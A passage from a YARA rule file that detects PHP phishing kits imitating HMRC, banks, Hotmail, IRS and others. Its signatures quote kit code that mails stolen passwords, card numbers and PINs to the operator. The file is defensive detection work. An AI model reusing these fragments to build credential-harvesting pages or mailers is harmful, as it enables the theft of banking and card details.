        $trigger = "<title>&#71;&#111;&#111;&#103;l&#101;"
    condition:
        $trigger
}

private rule PR05675 : trigger
{
    strings:
        $ps0 = ">This refund will be credited to your credit/debit card ending <?php echo $_SESSION"
    condition:
        $ps0
}

rule php_phishing_gov_uk_002 : phishing
{
    strings:
        $trigger = "<h1>Tax Refund</h1>"
    condition:
        $trigger and PR00042 and PR05675
}

private rule PR05676 : trigger
{
    strings:
        $ps0 = "; URL=https://www.gov.uk/government/organisations/hm-revenue-customs\">"
    condition:
        $ps0
}

rule php_phishing_gov_uk_003 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content="
    condition:
        $trigger and PR05676 and PR00247
}

private rule PR05677 : trigger
{
    strings:
        $ps0 = "html><head><meta http-equiv=\"refresh\" content=\"0;URL=https://href.li/?https://www.gov.uk/"
    condition:
        $ps0
}

rule php_phishing_gov_uk_004 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05677
}

rule php_phishing_gov_uk_004_02 : phishing
{
    strings:
        $trigger = "str_replace('##amount_refund##'"
    condition:
        $trigger
}

rule php_phishing_halifax_001 : phishing
{
    strings:
        $trigger = "window.location=\"http://www.halifax.co.uk/"
    condition:
        $trigger and PR00301
}

rule php_phishing_halifax_002 : phishing
{
    strings:
        $trigger = "header( \"Location: https://www.halifax-online.co.uk"
    condition:
        $trigger
}

rule php_phishing_halifax_003 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.halifax-online.co.uk/personal/logon/login.jsp\");"
    condition:
        $trigger
}

rule php_phishing_hitman_002 : phishing
{
    strings:
        $trigger = "Created BY Mr.HiTman"
    condition:
        $trigger and PR00301
}

rule php_phishing_hiworks_001 : phishing
{
    strings:
        $trigger = ">\xed\x95\x98\xec\x9d\xb4\xec\x9b\x8d\xec\x8a\xa4 \xec\x98\xa4\xed\x94\xbc\xec\x8a\xa4"
    condition:
        $trigger and PR00042
}

rule php_phishing_hotmail_002 : phishing
{
    strings:
        $trigger = "$subject = \"Hotmail Results | $ip | \".$_POST['Email'];"
    condition:
        $trigger and PR00301
}

rule php_phishing_hotmail_004 : phishing
{
    strings:
        $trigger = "header('Location: https://login.live.com/login.srf?wa=wsignin1.0&"
    condition:
        $trigger
}

rule php_phishing_hotmail_005 : phishing
{
    strings:
        $trigger = "https://sc.imp.live.com/content/dam/imp/surfaces/mail_signin/header/logo_mail.png"
    condition:
        $trigger
}

rule php_phishing_hotmail_006 : phishing
{
    strings:
        $trigger = " content=\"0;url=http://windows.microsoft.com/en-us/outlook/"
    condition:
        $trigger and PR00301 and PR01123
}

rule php_phishing_hotmail_007 : phishing
{
    strings:
        $trigger = "header(\"Location:  http://www.live.com\")"
    condition:
        $trigger and PR00301 and PR01123
}

rule php_phishing_huntington_001 : phishing
{
    strings:
        $trigger = "header(\"Location: https://onlinebanking.huntington.com/rol/Misc"
    condition:
        $trigger
}

private rule PR05678 : trigger
{
    strings:
        $ps0 = "Inloggen Mijn ICS"
    condition:
        $ps0
}

rule php_phishing_ics_001 : phishing
{
    strings:
        $trigger = "<input"
    condition:
        $trigger and PR00042 and PR00046 and PR05678
}

// MANUAL FIX NECESSARY
rule php_phishing_include_001 : phishing
{
    strings:
        $trigger = "include"
        $php_phishing_include_001_r0 = /include\(['\"][^;]+\/BOT[S_][^;]+\.php/
    condition:
        $trigger and $php_phishing_include_001_r0
}

private rule PR05679 : trigger
{
    strings:
        $ps0 = "include(\"system.php\");"
    condition:
        $ps0
}

rule php_phishing_include_002 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR05679
}

private rule PR05680 : trigger
{
    strings:
        $ps0 = "$handle = fopen(\"./logs.txt\", \"a\");"
    condition:
        $ps0
}

rule php_phishing_instagram_001 : phishing
{
    strings:
        $trigger = "Location:"
    condition:
        $trigger and PR05680
}

rule php_phishing_irs_001 : phishing
{
    strings:
        $trigger = "Internal Revenue Service</title>"
    condition:
        $trigger and PR00042
}

rule php_phishing_irs_002 : phishing
{
    strings:
        $trigger = "IRS Privacy Policy"
    condition:
        $trigger and PR00042
}

private rule PR05681 : trigger
{
    strings:
        $ps0 = "'https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa'"
    condition:
        $ps0
}

rule php_phishing_itunesconnect_001 : phishing
{
    strings:
        $trigger = "header('location:"
    condition:
        $trigger and PR05681
}

rule php_phishing_itunesconnect_002 : phishing
{
    strings:
        $trigger = ">i&Tau;unes"
    condition:
        $trigger and PR00042
}

private rule PR05682 : trigger
{
    strings:
        $ps0 = "L33bo phisher"
    condition:
        $ps0
}

rule php_phishing_L33bo_001 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR05682
}

private rule PR05683 : trigger
{
    strings:
        $ps0 = "Landbank iAccess"
    condition:
        $ps0
}

rule php_phishing_landbank_001 : phishing
{
    strings:
        $trigger = "Bank"
    condition:
        $trigger and PR05683
}

private rule PR05684 : trigger
{
    strings:
        $ps0 = "wcall=wicketAjaxPost("
    condition:
        $ps0
}

rule php_phishing_landbank_002 : phishing
{
    strings:
        $trigger = "Online"
    condition:
        $trigger and PR05684 and PR00353
}

rule php_phishing_landbank_003 : phishing
{
    strings:
        $trigger = "<title>LANDBANK"
    condition:
        $trigger and PR00281
}

rule php_phishing_lcl_fr_001 : phishing
{
    strings:
        $trigger = "document.location.replace('https://particuliers.secure.lcl.fr/"
    condition:
        $trigger and PR00301
}

private rule PR05685 : trigger
{
    strings:
        $ps0 = "header(\"Location: $redir\");"
    condition:
        $ps0
}

rule php_phishing_libero_001 : phishing
{
    strings:
        $trigger = "start.php?Libero="
    condition:
        $trigger and PR05685
}

rule php_phishing_libero_002 : phishing
{
    strings:
        $trigger = "<meta http-equiv=\"refresh\" content=\"3; url=https://login.libero.it/logout.php?"
    condition:
        $trigger
}

rule php_phishing_libero_003 : phishing
{
    strings:
        $trigger = "<title>Libero Mail"
    condition:
        $trigger
}

rule php_phishing_luno_001 : phishing
{
    strings:
        $trigger = "%68%74%74%70%73%3a%2f%2f%77%77%77%2e%6c%75%6e%6f%2e%63%6f%6d"
    condition:
        $trigger and PR00231
}

rule php_phishing_luno_001_02 : phishing
{
    strings:
        $trigger = "<title>Sign in | Luno"
    condition:
        $trigger
}

rule php_phishing_luno_002 : phishing
{
    strings:
        $trigger = "%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%6A%61"
    condition:
        $trigger and PR00231
}

private rule PR05686 : trigger
{
    strings:
        $ps0 = "header('Location: mail.php?main_domain='.$"
    condition:
        $ps0
}

rule php_phishing_mail_provider_validator_001 : phishing
{
    strings:
        $trigger = "= 'http://mail.'.$"
    condition:
        $trigger and PR05686
}

rule php_phishing_mailer_001 : phishing
{
    strings:
        $trigger = "$msg = \"Username: $userID\\nPassword : $password\\nCard Number : $cardNumber\\n"
    condition:
        $trigger and PR00301
}

rule php_phishing_mailer_002 : phishing
{
    strings:
        $trigger = "$mmn = $_POST['mmn'];"
    condition:
        $trigger and PR00301 and PR01123
}

rule php_phishing_mailer_003 : phishing
{
    strings:
        $trigger = "$pfw_subject = \"DOPE"
    condition:
        $trigger and PR00301 and PR01123
}

private rule PR05687 : trigger
{
    strings:
        $ps0 = ".$_POST['password'].\"\\r\\n Domain: \".$domainmail."
    condition:
        $ps0
}

rule php_phishing_mailer_007 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05687
}

private rule PR05688 : trigger
{
    strings:
        $ps0 = ".= \"Password : \".$_POST['Passwd'].\"\\n"
    condition:
        $ps0
}

rule php_phishing_mailer_008 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05688
}

rule php_phishing_mailer_009 : phishing
{
    strings:
        $trigger = "$subj = \"Abiodun - $ip\";"
    condition:
        $trigger and PR00431
}

rule php_phishing_mailer_010 : phishing
{
    strings:
        $trigger = "$message .= \"~~~~~~"
    condition:
        $trigger and PR00301 and PR00273
}

private rule PR05689 : trigger
{
    strings:
        $ps0 = "$message .='Card number:'"
    condition:
        $ps0
}

rule php_phishing_mailer_011 : phishing
{
    strings:
        $trigger = "mail($to, $subject, $"
    condition:
        $trigger and PR05689 and PR00437
}

rule php_phishing_mailer_012 : phishing
{
    strings:
        $trigger = "$msg .= \"Card No:"
    condition:
        $trigger and PR00301 and PR00273
}

rule php_phishing_mailer_013 : phishing
{
    strings:
        $trigger = "Number card: $cc"
    condition:
        $trigger and PR00301 and PR00273
}

rule php_phishing_mailer_014 : phishing
{
    strings:
        $trigger = "$subject = \"# Nobody # $user | $ip\";"
    condition:
        $trigger and PR00301
}

private rule PR05690 : trigger
{
    strings:
        $ps0 = "$msg=$eemail.\"<br/>\".$pass.\"<br/><br/> ok\"; $pay=$eemail;"
    condition:
        $ps0
}

rule php_phishing_mailer_015 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05690
}

private rule PR05691 : trigger
{
    strings:
        $ps0 = ".= \"Pwd"
    condition:
        $ps0
}

rule php_phishing_mailer_016 : phishing
{
    strings:
        $trigger = "header(\"location: $indexx\");"
    condition:
        $trigger and PR05691 and PR00301
}

rule php_phishing_mailer_017 : phishing
{
    strings:
        $trigger = "Cvv: \".$_POST['cvv'].\""
    condition:
        $trigger and PR00301 and PR00273
}

rule php_phishing_mailer_018 : phishing
{
    strings:
        $trigger = "interface ANTISCAMMER_GENERAL"
    condition:
        $trigger and PR00732 and PR01403
}

rule php_phishing_mailer_019 : phishing
{
    strings:
        $trigger = "<title>Upload a copy of your credit card"
    condition:
        $trigger and PR00301
}

private rule PR05692 : trigger
{
    strings:
        $ps0 = "header(\"Location: success.php?email=$email\");"
    condition:
        $ps0
}

rule php_phishing_mailer_021 : phishing
{
    strings:
        $trigger = "mail($email,$emailsubjectuser,$emailuseremail,$useremailheaders);"
    condition:
        $trigger and PR05692
}

rule php_phishing_mailer_022 : phishing
{
    strings:
        $trigger = "$data = \"----------Apple ID/Password Result"
    condition:
        $trigger and PR00301
}

rule php_phishing_mailer_023 : phishing
{
    strings:
        $trigger = "$message=$message.\"########CREATED"
    condition:
        $trigger and PR00371 and PR00050
}

rule php_phishing_mailer_024 : phishing
{
    strings:
        $trigger = "<tr><td>Password: $passwd</td></tr>"
    condition:
        $trigger and PR00301
}

rule php_phishing_mailer_025 : phishing
{
    strings:
        $trigger = "$arr=array($bilsnd, $IP);"
    condition:
        $trigger and PR00301
}

private rule PR05693 : trigger
{
    strings:
        $ps0 = "mail($bilsnd,$bilsub,$bilsmg,$bilhead);"
    condition:
        $ps0
}

rule php_phishing_mailer_026 : phishing
{
    strings:
        $trigger = "header(\"Location:http://mail.aol.com"
    condition:
        $trigger and PR05693
}

rule php_phishing_mailer_027 : phishing
{
    strings:
        $trigger = "mail($check_email.$this->check,\"=?UTF-8?B?\".base64"
    condition:
        $trigger and PR00437
}

private rule PR05694 : trigger
{
    strings:
        $ps0 = "?rand=13InboxLightaspxn."
    condition:
        $ps0
}

rule php_phishing_mailer_028 : phishing
{
    strings:
        $trigger = "passw"
    condition:
        $trigger and PR05694 and PR00437 and PR00301
}

rule php_phishing_mailer_029 : phishing
{
    strings:
        $trigger = ".= \"Password : \".$_POST['pass"
    condition:
        $trigger and PR00301 and PR00273
}

private rule PR05695 : trigger
{
    strings:
        $ps0 = "RaiffeisenbankHU"
    condition:
        $ps0
}

rule php_phishing_mailer_029_02 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR00301 and PR05695
}

rule php_phishing_mailer_029_03 : phishing
{
    strings:
        $trigger = "Raiffeisen DirektNet - Internet Banking"
    condition:
        $trigger and PR00653 and PR00371
}

private rule PR05696 : trigger
{
    strings:
        $ps0 = "?rand=13InboxLightaspxn.177"
    condition:
        $ps0
}

rule php_phishing_mailer_030 : phishing
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR05696
}

private rule PR05697 : trigger
{
    strings:
        $ps0 = "$message .= \"IP:"
    condition:
        $ps0
}

rule php_phishing_mailer_031 : phishing
{
    strings:
        $trigger = "$country = visitor_country();"
    condition:
        $trigger and PR05697 and PR00273
}

rule php_phishing_mailer_032 : phishing
{
    strings:
        $trigger = "$message  = \"+=========================+ login Spam Rezult"
    condition:
        $trigger
}

rule php_phishing_mailer_033 : phishing
{
    strings:
        $trigger = "$message .= \"cvv: \".$_POST"
    condition:
        $trigger and PR00493
}

rule php_phishing_mailer_035 : phishing
{
    strings:
        $trigger = "mail($messege,$subject,$rnessage,$headers);"
    condition:
        $trigger
}

rule php_phishing_mailer_037 : phishing
{
    strings:
        $trigger = "function aol($mail,$pass, $_sock){"
    condition:
        $trigger and PR00301
}

rule php_phishing_mailer_038 : phishing
{
    strings:
        $trigger = "$subject = \"Bank Info  | $ip\";"
    condition:
        $trigger
}

rule php_phishing_mailer_039 : phishing
{
    strings:
        $trigger = "$subject = \"Bill Info  | $ip\";"
    condition:
        $trigger
}

rule php_phishing_mailer_040 : phishing
{
    strings:
        $trigger = "$subject = \"Chase ReZulT | $ip\";"
    condition:
        $trigger
}

rule php_phishing_mailer_041 : phishing
{
    strings:
        $trigger = "By Benladen Crazy C0d3"
    condition:
        $trigger and PR01818
}

private rule PR05698 : trigger
{
    strings:
        $ps0 = "<div class=\"element-separator\"><hr><h3 class=\"section-break-title\">Payment Details</h3></div>"
    condition:
        $ps0
}

rule php_phishing_mailer_042 : phishing
{
    strings:
        $trigger = "str_replace"
    condition:
        $trigger and PR05698
}

private rule PR05699 : trigger
{
    strings:
        $ps0 = "\"Reply-To: {$_POST['reply_to']}\\r\\n\";"
    condition:
        $ps0
}

rule php_phishing_mailer_043 : phishing
{
    strings:
        $trigger = "$redir_url = \"http://"
    condition:
        $trigger and PR00437 and PR00301 and PR05699
}

private rule PR05700 : trigger
{
    strings:
        $ps0 = "Email: $user\\n Pass: $pass\\nip: $ip"
    condition:
        $ps0
}

rule php_phishing_mailer_044 : phishing
{
    strings:
        $trigger = "header(\"Location: http://mail.daum.net"
    condition:
        $trigger and PR05700 and PR00301
}

rule php_phishing_mailer_045 : phishing
{
    strings:
        $trigger = "$mailsubj = \"| Login: | $email | $password"
    condition:
        $trigger and PR00301
}

rule php_phishing_mailer_046 : phishing
{
    strings:
        $trigger = "<title>404 Not Found</title>"
    condition:
        $trigger and PR01351
}

rule php_phishing_mailer_047 : phishing
{
    strings:
        $trigger = "$codec = $_POST['feedbacknow'];"
    condition:
        $trigger and PR00317
}

private rule PR05701 : trigger
{
    strings:
        $ps0 = "$query = @unserialize(file_get_contents('http"
    condition:
        $ps0
}

private rule PR05702 : trigger
{
    strings:
        $ps0 = "(empty($_POST["
    condition:
        $ps0
}

private rule PR05703 : trigger
{
    strings:
        $ps0 = "REMOTE_ADDR"
    condition:
        $ps0
}

private rule PR05704 : trigger
{
    strings:
        $ps0 = "$msg"
    condition:
        $ps0
}

rule php_phishing_mailer_048 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR05701 and PR05702 and PR05703 and PR01123 and PR05704
}

private rule PR05705 : trigger
{
    strings:
        $ps0 = "$subj = \"PIN: $number3 | $ip\""
    condition:
        $ps0
}

rule php_phishing_mailer_049 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR00301 and PR05705
}

rule php_phishing_mailer_049_02 : phishing
{
    strings:
        $trigger = "$subj = \"LOGIN-BOI:"
    condition:
        $trigger and PR00301 and PR00273
}

rule php_phishing_mailer_049_03 : phishing
{
    strings:
        $trigger = "$subject = \"GOOD | $number1 | $ip\""
    condition:
        $trigger and PR00301 and PR00273
}

private rule PR05706 : trigger
{
    strings:
        $ps0 = "header (\"Location: success.html\")"
    condition:
        $ps0
}

rule php_phishing_mailer_049_04 : phishing
{
    strings:
        $trigger = "$subj"
    condition:
        $trigger and PR05706
}

rule php_phishing_mailer_049_05 : phishing
{
    strings:
        $trigger = "header (\"Location: success.php?email=$"
    condition:
        $trigger and PR00317
}

private rule PR05707 : trigger
{
    strings:
        $ps0 = "header (\"Location: invalid.php?email=$"
    condition:
        $ps0
}

rule php_phishing_mailer_049_06 : phishing
{
    strings:
        $trigger = "$subj"
    condition:
        $trigger and PR05707
}

rule php_phishing_mailer_049_07 : phishing
{
    strings:
        $trigger = "?bl=1&email=$ux\");"
    condition:
        $trigger and PR00431
}

rule php_phishing_mailer_049_08 : phishing
{
    strings:
        $trigger = "header(\"Location: $secfile?"
    condition:
        $trigger
}

private rule PR05708 : trigger
{
    strings:
        $ps0 = "$msg .= \"user: \".$_POST['user'].\"\\n\";"
    condition:
        $ps0
}

rule php_phishing_mailer_050 : phishing
{
    strings:
        $trigger = "echo \"<script>location.replace("
    condition:
        $trigger and PR05708 and PR00301 and PR04108
}

private rule PR05709 : trigger
{
    strings:
        $ps0 = "Password: {$userdata['password']}"
    condition:
        $ps0
}

rule php_phishing_mailer_052 : phishing
{
    strings:
        $trigger = "isset($_POST["
    condition:
        $trigger and PR05709
}

private rule PR05710 : trigger
{
    strings:
        $ps0 = "$headers.= \"From: Bradesco"
    condition:
        $ps0
}

rule php_phishing_mailer_053 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05710
}

rule php_phishing_mailer_054 : phishing
{
    strings:
        $trigger = "header(\"Location: $dst?login=$login&.verify?service=mail&data:text/html;charset=utf-8;base64,"
    condition:
        $trigger
}

rule php_phishing_mailer_055 : phishing
{
    strings:
        $trigger = "$message .= \"-------------Bron-------------\\n\";"
    condition:
        $trigger
}

private rule PR05711 : trigger
{
    strings:
        $ps0 = "trim (strip_tags (stripslashes ($_POST['passcode'])));"
    condition:
        $ps0
}

rule php_phishing_mailer_056 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR00301 and PR05711
}

rule php_phishing_mailer_057 : phishing
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00301 and PR00387 and PR04208
}

rule php_phishing_mailer_058 : phishing
{
    strings:
        $trigger = "$subject=\"Client Details"
    condition:
        $trigger
}

rule php_phishing_mailer_059 : phishing
{
    strings:
        $trigger = "if (!$mail->Send()) die ('Mailer Error: '.$mail->ErrorInfo);"
    condition:
        $trigger and PR00732
}

rule php_phishing_mailer_060 : phishing
{
    strings:
        $trigger = "echo 'God';"
    condition:
        $trigger and PR00437 and PR04085
}

private rule PR05712 : trigger
{
    strings:
        $ps0 = "= \"$subj \\n\\nLOGIN DETAILS"
    condition:
        $ps0
}

rule php_phishing_mailer_061 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05712
}

rule php_phishing_mailer_062 : phishing
{
    strings:
        $trigger = "$message = $_POST['ccnum'].\"|\".$_POST['exp"
    condition:
        $trigger and PR02741
}

private rule PR05713 : trigger
{
    strings:
        $ps0 = "$subject = \"[\".$ip_address.\"] New Login (\".$date.\")"
    condition:
        $ps0
}

rule php_phishing_mailer_063 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05713
}

rule php_phishing_mailer_064 : phishing
{
    strings:
        $trigger = "+ Victim Information"
    condition:
        $trigger and PR00273
}

private rule PR05714 : trigger
{
    strings:
        $ps0 = ";if (top.location != location) {top.location.href = document.location.href;}</script>"
    condition:
        $ps0
}

rule php_phishing_mailer_065 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05714
}

private rule PR05715 : trigger
{
    strings:
        $ps0 = "$.post('sendmail.php',{'postemail':stremail,'postpaswrd':strPassword,postdomain:strdomain}"
    condition:
        $ps0
}

rule php_phishing_mailer_066 : phishing
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00371 and PR05715
}

private rule PR05716 : trigger
{
    strings:
        $ps0 = "$_SESSION['password'] = $"
    condition:
        $ps0
}

private rule PR05717 : trigger
{
    strings:
        $ps0 = "$headers = \"From:"
    condition:
        $ps0
}

rule php_phishing_mailer_067 : phishing
{
    strings:
        $trigger = "$subject"
    condition:
        $trigger and PR05716 and PR05717 and PR00301 and PR02163
}

private rule PR05718 : trigger
{
    strings:
        $ps0 = "mail ($"
    condition:
        $ps0
}

rule php_phishing_mailer_068 : phishing
{
    strings:
        $trigger = ": $password"
    condition:
        $trigger and PR05718 and PR00273
}

private rule PR05719 : trigger
{
    strings:
        $ps0 = "$msgbank = '<html><head><style>"
    condition:
        $ps0
}

rule php_phishing_mailer_069 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR05719 and PR00437 and PR00301
}

// MANUAL FIX NECESSARY
private rule PR05720 : trigger
{
    strings:
        $ps0 = "}<?php $subj ="
    condition:
        $ps0
}

rule php_phishing_mailer_070 : phishing
{
    strings:
        $trigger = "<html"
        $php_phishing_mailer_070_r0 = /\$_POST\[.[pP][aA][sS][sS][wW][oO][rR][dD].\]/
    condition:
        $trigger and PR05720 and PR00301 and $php_phishing_mailer_070_r0
}

// MANUAL FIX NECESSARY
private rule PR05721 : trigger
{
    strings:
        $ps0 = "file_put_contents($file, $msg"
    condition:
        $ps0
}

rule php_phishing_mailer_071 : phishing
{
    strings:
        $trigger = "<html"
        $php_phishing_mailer_071_r0 = /\$_POST\[.[pP][aA][sS][sS][wW][oO][rR][dD].\]/
    condition:
        $trigger and PR05721 and PR00301 and $php_phishing_mailer_071_r0
}

rule php_phishing_mailer_075 : phishing
{
    strings:
        $trigger = "===USER CREATED=="
    condition:
        $trigger and PR00301
}

rule php_phishing_mailer_076 : phishing
{
    strings:
        $trigger = "require_once('geoplugin.class.php');"
    condition:
        $trigger and PR00317
}

rule php_phishing_mailer_077 : phishing
{
    strings:
        $trigger = "\"====================+"
    condition:
        $trigger and PR00273
}

private rule PR05722 : trigger
{
    strings:
        $ps0 = "$passwd = $_POST['passwd'];"
    condition:
        $ps0
}

rule php_phishing_mailer_078 : phishing
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00301 and PR05722 and PR00387
}

private rule PR05723 : trigger
{
    strings:
        $ps0 = "Host:"
    condition:
        $ps0
}

rule php_phishing_mailer_079 : phishing
{
    strings:
        $trigger = "mail($send"
    condition:
        $trigger and PR00317 and PR05723 and PR04150
}

private rule PR05724 : trigger
{
    strings:
        $ps0 = "$subject = \"Westpac Result Received"
    condition:
        $ps0
}

rule php_phishing_mailer_080 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR05724 and PR00437 and PR00301
}

// MANUAL FIX NECESSARY
rule php_phishing_mailer_081 : phishing
{
    strings:
        $trigger = "<html"
        $php_phishing_mailer_081_r0 = /\$subj[\s]*=[\s]*.[\W]*[\w]*[^@]+mail\(.[\w]+[\W]*[\w]*@[\w]*\.[\w]*.,[^\;]+\);[\s]*echo[\s]*[^\;]+html;/
    condition:
        $trigger and PR00301 and $php_phishing_mailer_081_r0
}

rule php_phishing_mailer_082 : phishing
{
    strings:
        $trigger = "header(\"Location: https://www.emiratesnbd.com"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
private rule PR05725 : trigger
{
    strings:
        $ps0 = "$str=$code ->card->type;break;case \"level\":$str=$code ->card->category;break;case \"bank\":$str=isset($code ->issuer ->name)"
    condition:
        $ps0
}

rule php_phishing_mailer_083 : phishing
{
    strings:
        $trigger = "$_POST"
        $php_phishing_mailer_083_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR05725 and $php_phishing_mailer_083_r0
}

private rule PR05726 : trigger
{
    strings:
        $ps0 = "$_SESSION['screen']=$_POST['screen'];$_SESSION['EML']=$_POST['EML'];$msg="
    condition:
        $ps0
}

rule php_phishing_mailer_084 : phishing
{
    strings:
        $trigger = "fwrite($"
    condition:
        $trigger and PR05726 and PR00273
}

// MANUAL FIX NECESSARY
private rule PR05727 : trigger
{
    strings:
        $ps0 = "fwrite($save,$msg);fclose($save);$subject="
    condition:
        $ps0
}

rule php_phishing_mailer_085 : phishing
{
    strings:
        $trigger = "$_POST"
        $php_phishing_mailer_085_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR05727 and PR00397 and $php_phishing_mailer_085_r0
}

private rule PR05728 : trigger
{
    strings:
        $ps0 = "substr(md5(uniqid(rand()))"
    condition:
        $ps0
}

rule php_phishing_mailer_086 : phishing
{
    strings:
        $trigger = "$subject"
    condition:
        $trigger and PR04093 and PR00301 and PR05728
}

private rule PR05729 : trigger
{
    strings:
        $ps0 = "header(\"Location: https://drive.google.com"
    condition:
        $ps0
}

rule php_phishing_mailer_087 : phishing
{
    strings:
        $trigger = "$ip = getenv(\"REMOTE_ADDR\");"
    condition:
        $trigger and PR05729
}

private rule PR05730 : trigger
{
    strings:
        $ps0 = "$subject = \"Your Apple ID was used"
    condition:
        $ps0
}

rule php_phishing_mailer_088 : phishing
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR05730 and PR00437
}

private rule PR05731 : trigger
{
    strings:
        $ps0 = "$message .= \"-------"
    condition:
        $ps0
}

rule php_phishing_mailer_089 : phishing
{
    strings:
        $trigger = "gethostbyaddr"
    condition:
        $trigger and PR02179 and PR00538 and PR05731
}

private rule PR05732 : trigger
{
    strings:
        $ps0 = "XBALTI"
    condition:
        $ps0
}

rule php_phishing_mailer_090 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00301 and PR05732
}

rule php_phishing_mailer_091 : phishing
{
    strings:
        $trigger = "mail($userinfo,$subject,$data);"
    condition:
        $trigger and PR00273 and PR01403
}

private rule PR05733 : trigger
{
    strings:
        $ps0 = "elseif(filter_var("
    condition:
        $ps0
}

rule php_phishing_mailer_092 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR05733 and PR04219
}

private rule PR05734 : trigger
{
    strings:
        $ps0 = "$VictimInfo1 = \"| Submitted"
    condition:
        $ps0
}

rule php_phishing_mailer_093 : phishing
{
    strings:
        $trigger = "eader('Location: "
    condition:
        $trigger and PR00301 and PR05734
}

private rule PR05735 : trigger
{
    strings:
        $ps0 = "$crd = $_POST['crd'];"
    condition:
        $ps0
}

rule php_phishing_mailer_094 : phishing
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00301 and PR00387 and PR05735
}

private rule PR05736 : trigger
{
    strings:
        $ps0 = "$msg = \"Email Address :"
    condition:
        $ps0
}

private rule PR05737 : trigger
{
    strings:
        $ps0 = "gethostbyaddr($_SERVER['REMOTE_ADDR']);"
    condition:
        $ps0
}

private rule PR05738 : trigger
{
    strings:
        $ps0 = "mail($to,$subj,$msg,$from);"
    condition:
        $ps0
}

rule php_phishing_mailer_095 : phishing
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR05736 and PR00437 and PR05737 and PR05738
}

private rule PR05739 : trigger
{
    strings:
        $ps0 = "$_POST['username']"
    condition:
        $ps0
}

private rule PR05740 : trigger
{
    strings:
        $ps0 = "if (isset($_SERVER['HTTP_X_FORWARDED_FOR"
    condition:
        $ps0
}

rule php_phishing_mailer_096 : phishing
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR05739 and PR05703 and PR01123 and PR05740
}

private rule PR05741 : trigger
{
    strings:
        $ps0 = "Email: \".$_POST['Email'].\"\\r\\n Pass: \".$_POST['Passwd"
    condition:
        $ps0
}

rule php_phishing_mailer_097 : phishing
{
    strings:
        $trigger = "header(\"location:"
    condition:
        $trigger and PR05741
}

private rule PR05742 : trigger
{
    strings:
        $ps0 = "B.r.a.d.e.s.c.o"
    condition:
        $ps0
}

rule php_phishing_mailer_098 : phishing
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR00301 and PR05742
}

private rule PR05743 : trigger
{
    strings:
        $ps0 = "$mesaj = \"IP: $ip | First Name: $fname"
    condition:
        $ps0
}

rule php_phishing_mailer_099 : phishing
{
    strings:
        $trigger = "header(\"Location:"
    condition:
        $trigger and PR05743
}

private rule PR05744 : trigger
{
    strings:
        $ps0 = "$click = fopen("
    condition:
        $ps0
}

rule php_phishing_mailer_100 : phishing
{
    strings:
        $trigger = "META HTTP-EQUIV="
    condition:
        $trigger and PR00317 and PR05744
}

// MANUAL FIX NECESSARY
rule php_phishing_mailer_101 : phishing
{
    strings:
        $trigger = "header(\"Location:"
        $php_phishing_mailer_101_r0 = /\$[\w]+[\s]*=[\s]*\$_POST\[.[\w]*.\];[^@]+\$[\w]+[\s]*=[\s]*.[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}.;[\s]*\$[\w]+[^;]+;[\s]*mail\(\$[\w]+[\s]*,\$[\w]+,[\s]*\$[\w]+\);[^:]+header\(..ocation:[\s]*[\w]+.[\w]+.\);/
    condition:
        $trigger and $php_phishing_mailer_101_r0
}

private rule PR05745 : trigger
{
    strings:
        $ps0 = "function post_self("
    condition:
        $ps0
}

private rule PR05746 : trigger
{
    strings:
        $ps0 = "$params = \"from=$from&mailto=$mailto&subject=$subject&msg=$msg&self"
    condition:
        $ps0
}

rule php_phishing_mailer_102 : phishing
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR05745 and PR01021 and PR05746 and PR02165
}

rule php_phishing_mailer_103 : phishing
{
    strings:
        $trigger = "isnotbottoruser() && $sendtoemail"
    condition:
        $trigger and PR04181 and PR00301 and PR02163 and PR02480
}

private rule PR05747 : trigger
{
    strings:
        $ps0 = "$passwd = $_POST['password'];"
    condition:
        $ps0
}

rule php_phishing_mailer_104 : phishing
{
    strings:
        $trigger = "$subj ="
    condition:
        $trigger and PR00386 and PR00301 and PR00387 and PR05747
}

private rule PR05748 : trigger
{
    strings:
        $ps0 = "list ($user, $domain) = explode (\"@\", $mail);"
    condition:
        $ps0
}

private rule PR05749 : trigger
{
    strings:
